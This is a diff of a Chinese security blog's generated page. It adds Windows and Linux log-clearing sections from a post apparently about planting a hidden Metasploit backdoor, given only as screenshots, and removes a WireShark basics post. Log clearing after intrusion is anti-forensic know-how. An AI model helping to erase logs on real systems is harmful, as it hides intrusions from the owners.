+<h4 id="5-1-window日志清理"><a href="#5-1-window日志清理" class="headerlink" title="5.1 window日志清理"></a><strong>5.1 window日志清理</strong></h4><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204549925.png" alt="image-20210819204549925"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204652982.png" alt="image-20210819204652982"></p>
+<p>​        也可以</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204737145.png" alt="image-20210819204737145"></p>
+<h4 id="5-2-Linux日志清理"><a href="#5-2-Linux日志清理" class="headerlink" title="5.2 Linux日志清理"></a><strong>5.2 Linux日志清理</strong></h4><p>kali进入其shell里操作</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204946095.png" alt="image-20210819204946095"></p>
+<p>  也可以</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205049062.png" alt="image-20210819205049062"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205105885.png" alt="image-20210819205105885"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205150600.png" alt="image-20210819205150600"></p>
+<p>还可以</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205205428.png" alt="image-20210819205205428"></p>
 
       
     </div>
@@ -1800,103 +2015,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">WireShark的一些知识</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-08-03 10:31:14" itemprop="dateCreated datePublished" datetime="2021-08-03T10:31:14+08:00">2021-08-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-09-07 18:53:20" itemprop="dateModified" datetime="2021-09-07T18:53:20+08:00">2021-09-07</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="WireShark的一些知识"><a href="#WireShark的一些知识" class="headerlink" title="WireShark的一些知识"></a>WireShark的一些知识</h2><h3 id="1-作用"><a href="#1-作用" class="headerlink" title="1.作用"></a>1.作用</h3><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802161548161.png" alt="image-20210802161548161"></p>
-<h3 id="2-模式"><a href="#2-模式" class="headerlink" title="2.模式"></a>2.模式</h3><h4 id="2-1-混杂模式"><a href="#2-1-混杂模式" class="headerlink" title="2.1 混杂模式"></a>2.1 混杂模式</h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802161733672.png" alt="image-20210802161733672"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802161812252.png" alt="image-20210802161812252"></p>
-<h4 id="2-2过滤"><a href="#2-2过滤" class="headerlink" title="2.2过滤"></a>2.2过滤</h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802161937642.png" alt="image-20210802161937642"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162009540.png" alt="image-20210802162009540"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162052506.png" alt="image-20210802162052506"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162114427.png" alt="image-20210802162114427"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162127187.png" alt="image-20210802162127187"></p>
-<h3 id="3-使用WireShark对常用协议抓包并分析原理"><a href="#3-使用WireShark对常用协议抓包并分析原理" class="headerlink" title="3 使用WireShark对常用协议抓包并分析原理"></a>3 使用WireShark对常用协议抓包并分析原理</h3><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162257783.png" alt="image-20210802162257783"></p>
-<h4 id="3-1ARP协议"><a href="#3-1ARP协议" class="headerlink" title="3.1ARP协议"></a>3.1ARP协议<img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162331955.png" alt="image-20210802162331955"></h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162420523.png" alt="image-20210802162420523"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162441441.png" alt="image-20210802162441441"></p>
-<h4 id="3-2ICMP协议"><a href="#3-2ICMP协议" class="headerlink" title="3.2ICMP协议"></a>3.2ICMP协议</h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162610320.png" alt="image-20210802162610320"></p>
-<h4 id="3-3TCP协议"><a href="#3-3TCP协议" class="headerlink" title="3.3TCP协议"></a>3.3TCP协议</h4><p>​    略</p>
-<p>​        连接：3次握手</p>
-<p>​        断开：4次挥手</p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802163024228.png" alt="image-20210802163024228"></p>
-<h4 id="3-4-HTTP协议"><a href="#3-4-HTTP协议" class="headerlink" title="3.4 HTTP协议"></a>3.4 HTTP协议</h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802163211983.png" alt="image-20210802163211983"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802163257889.png" alt="image-20210802163257889"></p>
-<h4 id="4-WireShark抓包解决服务器被黑上不了网-—之—TTL值被改"><a href="#4-WireShark抓包解决服务器被黑上不了网-—之—TTL值被改" class="headerlink" title="4 WireShark抓包解决服务器被黑上不了网 —之—TTL值被改"></a>4 WireShark抓包解决服务器被黑上不了网 —之—TTL值被改</h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802163534121.png" alt="image-20210802163534121"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802163931245.png" alt="image-20210802163931245"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802164135605.png" alt="image-20210802164135605"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802164227661.png" alt="image-20210802164227661"></p>
-<p>上面的地址就是经过的路由地址</p>
-<p>补充：保存文件时，保存为pcap格式是一种兼容格式，可以在其他软件打开</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1966,7 +2084,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-count">35</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
